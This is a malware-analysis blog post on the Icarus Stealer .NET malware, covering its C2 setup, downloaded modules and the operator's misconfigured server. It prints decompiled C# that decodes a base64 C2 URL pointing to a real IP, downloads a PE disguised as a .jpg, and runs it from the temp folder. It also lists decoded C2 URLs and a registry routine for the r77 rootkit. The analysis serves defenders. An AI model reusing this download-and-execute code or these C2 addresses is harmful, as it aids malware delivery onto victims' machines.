<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Icarus Stealer - What is it?</h1><p class="page-description">What is this malware and how does it work</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2022-10-09T00:00:00-05:00" itemprop="datePublished">
        Oct 9, 2022
      </time>
       â€¢ <span class="read-time" title="Estimated read time">
    
    
      1 min read
    
</span></p>

    
      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
      
        <a class="category-tags-link" href="/categories/#icarus">icarus</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#yara">yara</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#config">config</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#dotnet">dotnet</a>
        
      
      </p>
    

    
      
        <div class="pb-5 d-flex flex-justify-left">
            <div class="px-2">
                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
                </a>
            </div>
            <div class="px-2">
                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
                </a>
            </div>
          <div class="px-2">

    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2022-10-09-icarus.ipynb" role="button" target="_blank">
<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
    </a>
</div>

          
          
          
        </div>
      </header>

  <div class="post-content e-content" itemprop="articleBody">
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#Overview">Overview </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Samples">Samples </a></li>
<li class="toc-entry toc-h3"><a href="#References">References </a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Analysis">Analysis </a>
<ul>
<li class="toc-entry toc-h3"><a href="#C2">C2 </a>
<ul>
<li class="toc-entry toc-h4"><a href="#C2-URLs">C2 URLs </a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#Downloaded-Modules">Downloaded Modules </a>
<ul>
<li class="toc-entry toc-h4"><a href="#remove.jpg">remove.jpg </a></li>
<li class="toc-entry toc-h4"><a href="#rt.jpg">rt.jpg </a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Server-Misconfiguration">Server Misconfiguration </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Laravel-Debugger-Exposed">Laravel Debugger Exposed </a></li>
<li class="toc-entry toc-h3"><a href="#Open-Directory">Open Directory </a></li>
</ul>
</li>
</ul><!--
#################################################
### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
#################################################
# file to edit: _notebooks/2022-10-09-icarus.ipynb
-->

<div class="container" id="notebook-container">
        
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p><img src="https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png" alt=""></p>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Overview">
<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
</h2>
<h3 id="Samples">
<a class="anchor" href="#Samples" aria-hidden="true"><span class="octicon octicon-link"></span></a>Samples<a class="anchor-link" href="#Samples"> </a>
</h3>
<p><code>8e88de63c132f964891dd00501bee5078f27dfcec7ca122f19bd43f9ed933427</code> <a href="https://bazaar.abuse.ch/sample/8e88de63c132f964891dd00501bee5078f27dfcec7ca122f19bd43f9ed933427/">Malware Bazaar</a></p>
<h3 id="References">
<a class="anchor" href="#References" aria-hidden="true"><span class="octicon octicon-link"></span></a>References<a class="anchor-link" href="#References"> </a>
</h3>
<ul>
<li>Malware Sellix <a href="https://icarusdevelopment.sellix.io/terms">link</a>
</li>
<li>Karsten twitter <a href="https://twitter.com/struppigel/status/1566685309093511170">ref</a>
</li>
<li>They have a tutorial video! <a href="https://vimeo.com/730741460?embedded=true&amp;source=vimeo_logo&amp;owner=176036178">video</a>
</li>
</ul>
<h2 id="Analysis">
<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
</h2>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="C2">
<a class="anchor" href="#C2" aria-hidden="true"><span class="octicon octicon-link"></span></a>C2<a class="anchor-link" href="#C2"> </a>
</h3>
<p>The URLs are base64 encoded and link back to the c2 server. In this case the url links to a .jpg file which is infact a base64 endcoded PE.</p>
<div class="highlight"><pre><span></span><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">StopRootkit</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">WebClient</span> <span class="n">webClient</span> <span class="p">=</span> <span class="k">new</span> <span class="n">WebClient</span><span class="p">();</span>
    <span class="n">Stream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">webClient</span><span class="p">.</span><span class="n">OpenRead</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s">"aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3JlbW92ZS5qcGc="</span><span class="p">)));</span>
    <span class="n">StreamReader</span> <span class="n">streamReader</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
    <span class="kt">string</span> <span class="n">s</span> <span class="p">=</span> <span class="n">streamReader</span><span class="p">.</span><span class="n">ReadToEnd</span><span class="p">();</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="n">File</span><span class="p">.</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="n">GetTempPath</span><span class="p">()</span> <span class="p">+</span> <span class="s">"\\rkd.exe"</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
    <span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="n">GetTempPath</span><span class="p">()</span> <span class="p">+</span> <span class="s">"\\rkd.exe"</span><span class="p">);</span>
    <span class="n">File</span><span class="p">.</span><span class="n">Delete</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="n">GetTempPath</span><span class="p">()</span> <span class="p">+</span> <span class="s">"\\rkd.exe"</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<h4 id="C2-URLs">
<a class="anchor" href="#C2-URLs" aria-hidden="true"><span class="octicon octicon-link"></span></a>C2 URLs<a class="anchor-link" href="#C2-URLs"> </a>
</h4>
<ul>
<li>
<code>aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3JlbW92ZS5qcGc=</code> -&gt; <code>http://193.31.116.239/crypt/public/Update_Downloads/remove.jpg</code>
</li>
<li>
<code>aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3J0LmpwZw==</code> -&gt; <code>http://193.31.116.239/crypt/public/Update_Downloads/rt.jpg</code>
There are more... </li>
</ul>
<h3 id="Downloaded-Modules">
<a class="anchor" href="#Downloaded-Modules" aria-hidden="true"><span class="octicon octicon-link"></span></a>Downloaded Modules<a class="anchor-link" href="#Downloaded-Modules"> </a>
</h3>
<h4 id="remove.jpg">
<a class="anchor" href="#remove.jpg" aria-hidden="true"><span class="octicon octicon-link"></span></a>remove.jpg<a class="anchor-link" href="#remove.jpg"> </a>
</h4>
<p>Deletes the rootkit</p>
<div class="highlight"><pre><span></span><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">remove</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">try</span>
    <span class="p">{</span>
        <span class="kt">bool</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">bool</span><span class="p">[</span><span class="m">2</span><span class="p">];</span>
        <span class="n">array</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">flag</span> <span class="k">in</span> <span class="n">array</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">using</span> <span class="p">(</span><span class="n">RegistryKey</span> <span class="n">registryKey</span> <span class="p">=</span> <span class="n">RegistryKey</span><span class="p">.</span><span class="n">OpenBaseKey</span><span class="p">(</span><span class="n">RegistryHive</span><span class="p">.</span><span class="n">LocalMachine</span><span class="p">,</span> <span class="n">flag</span> <span class="p">?</span> <span class="n">RegistryView</span><span class="p">.</span><span class="n">Registry64</span> <span class="p">:</span> <span class="n">RegistryView</span><span class="p">.</span><span class="n">Registry32</span><span class="p">).</span><span class="n">OpenSubKey</span><span class="p">(</span><span class="s">"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="kt">bool</span> <span class="n">flag2</span> <span class="p">=</span> <span class="p">(</span><span class="n">registryKey</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="s">"AppInit_DLLs"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span> <span class="k">as</span> <span class="kt">string</span><span class="p">).</span><span class="n">Contains</span><span class="p">(</span><span class="s">"r77-"</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">flag2</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">registryKey</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="s">"AppInit_DLLs"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<h4 id="rt.jpg">
<a class="anchor" href="#rt.jpg" aria-hidden="true"><span class="octicon octicon-link"></span></a>rt.jpg<a class="anchor-link" href="#rt.jpg"> </a>
</h4>
<p>This is a simple startup function for an open source userland rootkit that can be found on GitHub <a href="https://github.com/bytecode77/r77-rootkit">r77-rootkit</a>.</p>
<h2 id="Server-Misconfiguration">
<a class="anchor" href="#Server-Misconfiguration" aria-hidden="true"><span class="octicon octicon-link"></span></a>Server Misconfiguration<a class="anchor-link" href="#Server-Misconfiguration"> </a>
</h2>
<p>It's almost like the developer knows they made some mistakes...
<img src="https://i.imgur.com/eXIIX6b.jpg" alt=""></p>
<h3 id="Laravel-Debugger-Exposed">
<a class="anchor" href="#Laravel-Debugger-Exposed" aria-hidden="true"><span class="octicon octicon-link"></span></a>Laravel Debugger Exposed<a class="anchor-link" href="#Laravel-Debugger-Exposed"> </a>
</h3>
<p>A typo in one of the C2 URLs exposed a server error with a full stack trace. This revealed that the developer was uing the <a href="https://laravel.com/">laravel</a> PHP framework and had left the debugger publically exposed.
<img src="https://i.imgur.com/Mxz6nDx.png" alt=""></p>
<h3 id="Open-Directory">
<a class="anchor" href="#Open-Directory" aria-hidden="true"><span class="octicon octicon-link"></span></a>Open Directory<a class="anchor-link" href="#Open-Directory"> </a>
</h3>
<p>The stack trace led to the discovery that the server root had been configured as an open directory with many files publicly served to the Internet including logs.
<img src="https://i.imgur.com/rU9UYGy.png" alt=""></p>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p><strong>Analysis Stopped:</strong></p>
<p>There are more files and download links that could be investigated but the malware is so simple and the server configured so poorly we stopped our analysis. This malware looks more like a hobby project than a professional business...</p>

</div>
</div>
</div>
</div>



  </div><a class="u-url" href="/icarus/yara/config/dotnet/2022/10/09/icarus.html" hidden></a>
</article>
